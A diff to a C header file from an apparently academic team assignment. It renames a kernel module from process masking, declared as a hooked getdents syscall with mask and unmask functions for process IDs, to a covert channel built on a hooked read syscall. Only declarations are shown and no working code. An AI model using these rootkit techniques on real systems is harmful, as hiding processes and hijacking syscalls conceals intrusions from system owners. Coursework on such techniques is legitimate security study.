@@ -6,7 +6,7 @@
 /*   Team: 105                                                                 */
 /*   Assignment: 7                                                             */
 /*                                                                             */
-/*   Filename: process_masking.h                                               */
+/*   Filename: covert_channel.h                                                */
 /*                                                                             */
 /*   Authors:                                                                  */
 /*       Name: Matei Pavaluca                                                  */
@@ -17,21 +17,18 @@
 /*                                                                             */
 /*   Date: December 2015                                                       */
 /*                                                                             */
-/*   Usage: Header file for module `process_masking.c`                         */
+/*   Usage: Header file for module `covert_channel.c`                          */
 /*                                                                             */
 /*******************************************************************************/
 
-#ifndef __PROCESS_MASKING__
-#define __PROCESS_MASKING__
+#ifndef __COVERT_CHANNEL__
+#define __COVERT_CHANNEL__
 
 
 /* Declaration of functions */
-int process_masking_init(int);
-int process_masking_exit(void);
+int covert_channel_init(int);
+int covert_channel_exit(void);
 
-asmlinkage int process_masking_getdents_syscall(unsigned int, struct linux_dirent *, unsigned int);
-
-void mask_process(pid_t);
-void unmask_process(pid_t);
+asmlinkage long covert_channel_read_syscall(unsigned int, char __user *, size_t);
 
 #endif
